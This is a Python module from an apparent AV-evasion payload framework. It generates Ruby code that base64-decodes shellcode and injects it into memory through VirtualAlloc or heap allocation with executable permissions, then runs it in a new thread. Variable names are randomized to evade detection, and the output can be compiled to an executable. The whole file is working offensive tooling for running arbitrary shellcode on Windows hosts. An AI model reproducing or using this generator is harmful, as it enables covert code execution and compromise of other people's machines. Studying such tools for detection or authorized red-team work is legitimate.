"""

Ruby inline base64 decoding of shellcode and injector

TODO: better randomization


Module built by @ChrisTruncer

"""

import base64

from modules.common import shellcode
from modules.common import helpers


class Payload:

    def __init__(self):
        # required options
        self.description = "Base64 decode for shellcode injection"
        self.language = "ruby"
        self.extension = "rb"
        self.rating = "Normal"

        # optional
        self.shellcode = shellcode.Shellcode()

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "INJECT_METHOD"  : ["Virtual", "Virtual, or Heap"]
                                }

    def generate(self):

        Shellcode = self.shellcode.generate(self.required_options)
        print Shellcode
        Shellcode = base64.b64encode(Shellcode)

        # randomly generate out variable names
        payloadName = helpers.randomString()
        ptrName = helpers.randomString()
        threadName = helpers.randomString()
        heap_name = helpers.randomString()

        payloadCode = "require 'rubygems'\n"
        payloadCode += "require 'win32/api'\n"
        payloadCode += "include Win32\n"
        payloadCode += "require 'base64'\n"
        payloadCode += "exit if Object.const_defined?(:Ocra)\n"

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payloadCode += "v = API.new('VirtualAlloc', 'IIII', 'I');r = API.new('RtlMoveMemory', 'IPI', 'V');c = API.new('CreateThread', 'IIIIIP', 'I');w = API.new('WaitForSingleObject', 'II', 'I')\n"
            payloadCode += payloadName + " = [\"" + Shellcode + "\".unpack(\"m\")[0].delete(\"\\\\\\\\x\")].pack(\"H*\")\n"
            payloadCode += "%s = v.call(0,(%s.length > 0x1000 ? %s.length : 0x1000), 0x1000, 0x40)\n" %(ptrName,payloadName,payloadName)
            payloadCode += "x = r.call(%s,%s,%s.length); %s = c.call(0,0,%s,0,0,0); x = w.call(%s,0xFFFFFFF)\n" %(ptrName,payloadName,payloadName,threadName,ptrName,threadName)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payloadCode += "v = API.new('HeapCreate', 'III', 'I');q = API.new('HeapAlloc', 'III', 'I');r = API.new('RtlMoveMemory', 'IPI', 'V');c = API.new('CreateThread', 'IIIIIP', 'I');w = API.new('WaitForSingleObject', 'II', 'I')\n"
            payloadCode += payloadName + " = [\"" + Shellcode + "\".unpack(\"m\")[0].delete(\"\\\\\\\\x\")].pack(\"H*\")\n"
            payloadCode += "%s = v.call(0x0004,(%s.length > 0x1000 ? %s.length : 0x1000), 0)\n" %(heap_name,payloadName,payloadName)
            payloadCode += "%s = q.call(%s, 0x00000008, %s.length)\n" %(ptrName,heap_name,payloadName)
            payloadCode += "x = r.call(%s,%s,%s.length); %s = c.call(0,0,%s,0,0,0); x = w.call(%s,86400)\n" %(ptrName,payloadName,payloadName,threadName,ptrName,threadName)
        return payloadCode
